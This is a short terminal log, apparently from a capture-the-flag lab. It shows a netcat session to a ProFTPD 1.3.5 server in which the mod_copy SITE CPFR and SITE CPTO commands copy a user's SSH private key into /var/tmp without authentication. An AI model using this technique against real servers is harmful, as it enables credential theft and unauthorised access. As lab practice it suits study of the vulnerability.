
```sh
┌──(kali㉿kali)-[~]
└─$ nc 10.10.140.251 21      
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.140.251]
^C
```

```sh
(kali㉿kali)-[~]
└─$ nc 10.10.140.251 21       
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.140.251]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

